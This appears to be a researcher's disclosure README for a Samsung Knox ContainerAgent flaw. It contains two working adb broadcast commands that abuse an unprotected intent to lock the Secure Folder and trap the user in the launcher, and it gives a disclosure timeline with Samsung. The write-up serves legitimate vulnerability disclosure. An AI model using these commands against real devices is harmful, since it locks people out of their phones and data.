# Samsung ContainerAgent Vulnerability
Due to an unprotected intent in the ContainerAgent app, a Samsung smartphone can become temporarily bricked. This vulnerability can be used to create a Locker.

# How To
**Lock Secure folder**
```bash
adb shell am broadcast -a com.samsung.android.knox.containeragent.LocalCommandReceiver.ACTION_COMMAND --ei "com.samsung.android.knox.containeragent.LocalCommandReceiver.EXTRA_COMMAND_ID" 1001 --ei "android.intent.extra.user_handle" 150
```

**Go back to launcher**
```bash
adb shell am broadcast -a com.samsung.android.knox.containeragent.LocalCommandReceiver.ACTION_COMMAND --ei "com.samsung.android.knox.containeragent.LocalCommandReceiver.EXTRA_COMMAND_ID" 1002 --ei "android.intent.extra.user_handle" 0
```

# Result
The user will be stuck in the launcher and his Secure Folder will be locked all the time.

# Disclosure
- 04/02/19: Initial finding by [@fs0c131y](https://twitter.com/fs0c131y)
- 11/03/19: Responsible disclosure to the Samsung Security Team
- 18/03/19: The Samsung Security Team considered this issue as no/little security impact

# Contact
Follow me on [Twitter](https://twitter.com/fs0c131y)! You can also find a small part of my work at [https://fs0c131y.com](https://fs0c131y.com)

# Credits
The investigation and the POC has been made with ❤ by [@fs0c131y](https://twitter.com/fs0c131y)